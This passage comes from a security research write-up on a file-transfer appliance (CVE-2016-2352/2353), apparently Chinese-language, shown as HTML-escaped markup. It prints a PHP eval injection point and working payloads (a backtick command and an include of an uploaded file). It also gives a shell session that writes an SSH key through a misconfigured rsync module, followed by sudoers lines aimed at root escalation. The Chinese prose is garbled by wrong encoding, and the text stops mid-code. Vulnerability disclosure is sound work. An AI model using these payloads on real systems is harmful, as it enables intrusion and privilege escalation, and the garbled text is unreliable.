&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/(.+)\(.*\)/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_session_cache&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_user_contact&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;valid_password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_update_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_format_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_email_verified&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_exist_allow_direct_download&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_profile_auth&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/[\\\/&quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(count(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, array(&quot;nickname&quot;=&amp;gt;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;))));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, &quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Â¶ÇÊûúÂ∑≤Áü•Âä†ÂØÜ KEY ÁöÑË©±ÔºåÂç≥ÂèØÊéßÂà∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decrypt( $_POST[fc] )&lt;/code&gt; ÁöÑËº∏Âá∫ÔºåËÄåÂæåÈù¢ÁöÑÊ≠£Ë¶èË°®Á§∫ÂºèÈõñÁÑ∂ÈáùÂ∞çÂáΩÊï∏ÂêçÁ®±ÈÄ≤Ë°åÁôΩÂêçÂñÆÈÅéÊøæÔºå‰ΩÜÊòØÊ≤íÂ∞çÂèÉÊï∏ÈÄ≤Ë°åÈÅéÊøæÔºåÂ¶ÇÊ≠§‰∏Ä‰æÜÊàëÂÄëÂèØ‰ª•Âú®ÂèÉÊï∏ÁöÑÈÉ®ÂàÜÊèíÂÖ•‰ªªÊÑè‰ª£Á¢ºÔºåÂîØ‰∏ÄÁöÑÊ¢ù‰ª∂Â∞±ÊòØ‰∏çËÉΩÊúâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt; Âá∫ÁèæÔºå‰ΩÜÁî±Êñº PHP ÁöÑÈ¨ÜÊï£ÁâπÊÄßÔºåÁé©Ê≥ïÂÖ∂ÂØ¶ÂæàÂ§öÔºåÈÄôË£°ÂàóËàâÂÖ©ÂÄãÔºö&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Áõ¥Êé•ÈÄèÈÅéÂèçÂºïËôüÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§Ôºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
Êõ¥ÂÑ™ÈõÖÁöÑÊñπÂºèÂèØ‰ª•ÈÄèÈÅé include Ë™ûÊ≥ïÂºïÂÖ•‰∏äÂÇ≥Ê™îÊ°àÁöÑ tmp_nameÔºåÈÄôÊ®£ÂêÑÁ®Æ‰øùË≠∑ÈÉΩ‰∏çÁî®ÊìîÂøÉÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;Âú®ÂèñÂæó PHP Á∂≤È†ÅÊ¨äÈôêÂæåÔºåÁôºÁèæÊâÄÂ±¨Ê¨äÈôêÁÇ∫ nobodyÔºåÁÇ∫‰∫ÜÈÄ≤Ë°åÊõ¥Ê∑±ÂÖ•ÁöÑÁ†îÁ©∂ÔºåÂú®Â∞çÁí∞Â¢ÉÈÄ≤Ë°åÂØ©Ë¶ñÂæåÔºåÁôºÁèæÂÖ©ÂÄãÂèØÁî®‰æÜÊèêÂçáÊ¨äÈôê‰πãÂº±Èªû„ÄÇ&lt;/p&gt;

&lt;h5 id=&quot;1-rsync-ÈÖçÁΩÆÈåØË™§&quot;&gt;1. Rsync ÈÖçÁΩÆÈåØË™§&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂÖ∂‰∏≠Ê®°ÁµÑÂêçÁ®± soggycat Â∞ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt; ÁÇ∫‰ªª‰Ωï‰∫∫ÂèØËÆÄÂèØÂØ´ÔºåÊâÄ‰ª•ÂèØÂ∞á SSH Key ÂØ´Ëá≥ /home/soggycat/.ssh/ Âæå‰ª• soggycat Ë∫´ÂàÜÁôªÂÖ•&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;         606 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_dsa.pub &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_dsa &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&apos;0,0.0.0.0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in ‚Äúyum-client.pl‚Äù&lt;/h5&gt;

&lt;p&gt;Âú® FTA ‰∏≠ÔºåÁÇ∫‰∫Ü‰ΩøÁ≥ªÁµ±ÂèØ‰ª•Áõ¥Êé•ÈÄèÈÅéÁ∂≤È†Å‰ªãÈù¢ÈÄ≤Ë°åÊõ¥Êñ∞ÔºåÂõ†Ê≠§Âú® sudoers ÈÖçÁΩÆ‰∏≠ÁâπÂà•ÈáùÂ∞ç nobody Áî®Êà∂ÂÖÅË®±Áõ¥Êé•‰ΩøÁî® root Ê¨äÈôêÂü∑Ë°åÊåá‰ª§Ôºå‰∏¶ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; ÈÄôÈöªÁ®ãÂºèÈÄ≤Ë°åËªüÈ´îÊõ¥Êñ∞&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root     ALL=(ALL) &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt;
admin    &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂÖ∂‰∏≠ YUM_CLIENT Â∞±ÊòØÈÄ≤Ë°åÊõ¥Êñ∞ÁöÑÊåá‰ª§ÔºåÈÉ®ÂàÜ‰ª£Á¢ºÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cdrom=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
